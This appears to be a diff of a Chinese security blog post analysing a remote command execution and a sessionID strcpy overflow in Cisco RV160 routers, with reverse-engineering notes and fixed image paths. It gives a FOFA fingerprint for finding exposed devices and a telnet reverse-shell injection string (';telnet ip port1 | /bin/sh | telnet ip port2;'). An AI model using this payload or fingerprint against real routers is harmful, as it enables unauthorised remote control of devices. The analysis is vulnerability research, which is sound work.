+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224458063.png" alt="image-20211209224458063"></p>
 <h2 id="公网测试"><a href="#公网测试" class="headerlink" title="公网测试"></a>公网测试</h2><p>公网设备指纹：在fofa上搜索 header&#x3D;”frame-ancestors ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; style-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’”</p>
 <p>经过测试，可以获取到shell。</p>
 <p>通过telnet 获取shell<br>;telnet ip port1 | &#x2F;bin&#x2F;sh | telnet ip port2;</p>
@@ -166,22 +166,22 @@
 <p>返回值：该函数返回str1中第一个不在字符串str2中出现的字符下标</p>
 </blockquote>
 <p>下图的代码的意思是，先判断字符串中存在“Cookie: ” 字符串，如果有，那就获取cookes 的值。strspn(s1+7,”\t”) 的意思是获取cookies 的值最后的下标。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210155658793.png" alt="image-20211210155658793"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210155658793.png" alt="image-20211210155658793"></p>
 <p>接下来看那个函数是用来cookies 的值。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210161633200.png" alt="image-20211210161633200"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210161633200.png" alt="image-20211210161633200"></p>
 <p>但是在哪之前，sub_169F0()函数，这个函数是用来判断当前请求的url资源内容是否需要登录才能访问。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212212120467.png" alt="image-20211212212120467"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212212120467.png" alt="image-20211212212120467"></p>
 <p>进入到sub_1625C函数中，a1 的值是cookies ，代码是判断cookies 不为空就进入到sub_16138函数。</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212222952416.png" alt="image-20211212222952416"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212222952416.png" alt="image-20211212222952416"></p>
 <p>进入到sub_16138函数中。从这个函数中，可以看出来，这个函数是获取cookeis 的值中的sessionID 的值。</p>
 <blockquote>
 <p>char *strstr(const char *haystack, const char *needle)** 在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’</p>
 <p>char *strtok(char *str, const char *delim) 分解字符串str为一组字符串，delim为分隔符。delim 包含分隔符的C字符串。</p>
 <p>返回值：该函数返回被分解的第一个字符串，如果没有可检索的字符串，则返回一个空指针。</p>
 </blockquote>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212223526769.png" alt="image-20211212223526769"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212223526769.png" alt="image-20211212223526769"></p>
 <p>sub_15CE4()函数中，形参a2 指向空字符，所以其实最后就是未限制sessionID长度在strcpy时的溢出</p>
-<p><img src="//23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212232211788.png" alt="image-20211212232211788"></p>
+<p><img src="/../../source/images/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212232211788.png" alt="image-20211212232211788"></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Cisco RV160W 系列路由器漏洞：从1day 分析到0day挖掘</p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8qviTeiuJb5XU8jDdHMW8Q">https://mp.weixin.qq.com/s/8qviTeiuJb5XU8jDdHMW8Q</a></p>
 <p>bindiff 文件对比参考RX40 的文章</p>
